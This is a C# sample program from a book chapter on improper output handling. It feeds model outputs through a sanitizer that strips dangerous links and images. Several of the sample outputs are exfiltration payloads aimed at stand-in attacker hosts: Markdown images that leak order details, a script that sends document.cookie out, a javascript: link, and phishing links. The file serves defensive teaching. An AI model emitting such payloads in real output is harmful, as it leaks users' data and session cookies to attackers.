// Chapter 13, Section 13.4: Improper output handling.
// Runs a set of malicious and benign model outputs through AssistantOutputSanitizer (in
// Shared/Northwind.Shared/Security) and shows the safe HTML that would reach the browser. Needs no model.

using Northwind.Shared.AI;
using Northwind.Shared.Security;

SampleConsole.Header("Chapter 13.4: Safe output handling");

var sanitizer = new AssistantOutputSanitizer(
    new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "www.northwindtraders.example", "help.northwindtraders.example" });

(string Description, string Output)[] outputs =
[
    ("Image-based exfiltration (fetched without a click)",
     "Here is your order summary. ![tracking](https://attacker.example/collect?d=NW-10248%20Thomas%20Hardy%20London)"),

    ("The same image in reference style, with the URL on a later line",
     "Here is your order summary. ![tracking][1]\n\n[1]: https://attacker.example/collect?d=NW-10248%20Thomas%20Hardy%20London"),

    ("A reference-style link to an unknown host (unlinked)",
     "Please [confirm your details][verify] to finish the return.\n\n[verify]: https://attacker.example/phish"),

    ("Raw HTML and script (shown as text, never run)",
     "Click <a href=\"https://evil.example\">here</a> for help. <script>fetch('https://evil.example?c='+document.cookie)</script>"),

    ("A link to an allowed host over HTTPS (kept)",
     "You can read our [returns policy](https://www.northwindtraders.example/policies/returns) for details."),

    ("An allowed host over plain HTTP, and an unknown host (both unlinked)",
     "See [the details](http://www.northwindtraders.example/insecure) or [claim your voucher](https://attacker.example/phish)."),

    ("A javascript: link",
     "[Claim your refund](javascript:document.location='https://attacker.example/?c='+document.cookie)"),

    ("Ordinary text",
     "Your refund of $95.00 will reach your original payment method within 5 to 10 business days.")
];

foreach ((string description, string output) in outputs)
{
    SampleConsole.Section(description);
    Console.WriteLine($"model:     {output.ReplaceLineEndings(" / ")}");
    Console.WriteLine($"rendered:  {sanitizer.ToSafeHtml(output).Trim().ReplaceLineEndings(" ")}");
}

SampleConsole.Note("The sanitizer works on the parsed Markdown, so every way of writing an image or a link is checked. " +
                   "In production, also set a content security policy that restricts where images can be loaded from.");
